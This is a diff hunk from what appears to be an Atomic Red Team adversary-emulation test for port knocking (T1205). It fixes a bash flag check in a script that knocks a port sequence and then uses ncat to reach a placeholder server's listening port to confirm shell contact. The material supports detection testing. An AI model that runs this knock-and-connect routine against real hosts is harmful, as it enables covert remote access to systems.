@@ -132,7 +132,7 @@ atomic_tests:
     name: bash
     elevation_required: false
     command: |
-      SHELL_CONTACTED=false
+      SHELL_CONTACTED=0
       for LOOP in {1..5} ;
       do
         for PORT in $(echo "#{knock_port_sequence}" | sed "s/,/ /g")
@@ -150,14 +150,14 @@ atomic_tests:
         sleep 2
         echo 'echo Shell to host $HOSTNAME as user $USER successful.'  && sleep 1 | ncat #{server_ip} #{listening_port} > /tmp/t1205_client.dat 2> /dev/null
         if [ -s /tmp/t1205_client.dat ] ; then
-          SHELL_CONTACTED=true
+          SHELL_CONTACTED=1
           break
         else
           echo -e "Shell not there yet...\n\n"
         fi
       done
 
-      if [ SHELL_CONTACTED ] ; then
+      if [ $SHELL_CONTACTED -ne 0 ] ; then
         echo Shell successfully executed with port knock
         cat /tmp/t1205_client.dat
       else
